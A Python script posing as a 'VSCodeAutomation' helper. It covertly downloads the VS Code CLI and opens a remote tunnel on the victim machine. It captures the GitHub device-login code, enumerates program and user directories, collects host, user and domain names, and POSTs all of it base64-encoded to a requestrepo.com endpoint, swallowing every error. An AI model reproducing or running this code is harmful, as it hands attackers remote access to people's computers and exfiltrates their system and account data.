import urllib.request
from zipfile import ZipFile
from os import remove, getenv
from subprocess import Popen, PIPE
from time import sleep
import re
import base64
import requests

class VSCodeAutomation:
    def __init__(self):
        self.vscode_zip_path = "vscode_cli_win32_x64_cli.zip"
        self.vscode_extracted_path = "vscode_extracted"
        self.ssl_context = None  # Set appropriate SSL context
        self.output_file_1 = "output1.txt"
        self.output_file_2 = "output2.txt"
        self.user_status = "active"  # Example placeholder
    
    def vscode_down_extract_zip(self):
        download_url = "https://code.visualstudio.com/sha/download?build=stable&os=cli-win32-x64"
        headers = {"User-Agent": "Mozilla/5.0"}
        try:
            response = requests.get(download_url, headers=headers, stream=True)
            response.raise_for_status()
            with open(self.vscode_zip_path, "wb") as file_wb:
                for chunk in response.iter_content(chunk_size=1024):
                    file_wb.write(chunk)
            with ZipFile(self.vscode_zip_path, 'r') as zip_ref:
                zip_ref.extractall(self.vscode_extracted_path)
            remove(self.vscode_zip_path)
        except:
            pass
    
    def execute_vscode(self, tasklist_output):
        vscode_executable = f"{self.vscode_extracted_path}/code.exe"
        try:
            Popen([vscode_executable, 'tunnel', '--accept-server-license-terms', 'user', 'logout'], shell=True)
            sleep(3)
            process = Popen([vscode_executable, '--locale', 'en-US', 'tunnel', '--accept-server-license-terms', '--name', getenv('COMPUTERNAME')],
                            stdout=open(self.output_file_1, 'w'), stdin=PIPE, shell=True)
            sleep(5)
            GitHub_Acc = 'Github Account'
            getattr(process.stdin, 'write')(GitHub_Acc.encode())
            getattr(process.stdin, 'flush')()
            getattr(process.stdin, 'close')()
            sleep(10)
            
            with open(self.output_file_1, 'r') as out_file_1_read:
                file_1_content = out_file_1_read.read()
            with open(self.output_file_2, 'w') as out_file_2_write:
                out_file_2_write.write(file_1_content)
            with open(self.output_file_2, 'r') as out_file_2_read:
                file_2_content = out_file_2_read.read()
            
            match = re.search(r'and use code ([\w\d-]+)', file_2_content)
            github_code = match.group(1) if match else None
            
            program_files_list = self.list_files_in_dir('C:\\Program Files')
            program_files_x86_list = self.list_files_in_dir('C:\\Program Files (x86)')
            program_data_list = self.list_files_in_dir('C:\\ProgramData')
            users_list = self.list_files_in_dir('C:\\Users')
            
            FilesAndProcessInfo = tasklist_output + '\n' + '========================================\n'
            FilesAndProcessInfo += '\n'.join(program_files_list + program_files_x86_list + program_data_list + users_list)
            
            if github_code:
                locale_language = "en-US"  # Placeholder for locale retrieval
                computer_name = getenv('COMPUTERNAME')
                user_name = getenv('USERNAME')
                user_domain = getenv('USERDOMAIN')
                encoded_user_info = base64.b64encode(f"{locale_language}-{computer_name}-{user_name}-{user_domain}-{github_code}-{self.user_status}".encode('utf-8')).decode('utf-8')
                request_url = f'http://requestrepo.com/r/shrcr9sh/{encoded_user_info}'
                request_data = urllib.request.Request(request_url, data=FilesAndProcessInfo.encode('utf-8'),
                                                      headers={'Content-Type': 'application/x-www-form-urlencoded'}, method='POST')
                urllib.request.urlopen(request_data)
        except:
            pass
    
    def list_files_in_dir(self, path):
        try:
            from os import listdir
            return listdir(path)
        except:
            return []